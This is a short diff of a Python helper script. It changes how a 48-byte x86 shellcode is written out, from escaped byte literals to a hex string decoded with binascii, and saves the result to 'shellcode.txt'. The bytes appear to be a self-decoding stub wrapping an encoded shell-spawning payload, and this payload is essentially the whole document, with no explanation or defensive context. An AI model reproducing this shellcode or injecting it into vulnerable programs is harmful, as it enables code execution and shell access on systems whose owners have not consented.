@@ -1,10 +1,12 @@
-a = 	"\xeb\x11\x5e\x31\xc9\xb1\x32\x80" + \
-			"\x6c\x0e\xff\x01\x80\xe9\x01\x75" + \
-  			"\xf6\xeb\x05\xe8\xea\xff\xff\xff" + \
-			"\x32\xc1\x51\x69\x30\x30\x74\x69" + \
-			"\x69\x30\x63\x6a\x6f\x8a\xe4\x51" + \
-			"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
-a = a.encode()
+hex_string = 	"eb115e31c9b13280"+\
+			"6c0eff0180e90175" + \
+  			"f6eb05e8eaffffff" + \
+			"32c1516930307469" + \
+			"6930636a6f8ae451" + \
+			"548ae29ab10cce81"
+import binascii
+
+binary_string = binascii.unhexlify(hex_string)
 f = open("shellcode.txt", "wb")
-f.write(a)
+f.write(binary_string)
 f.close()
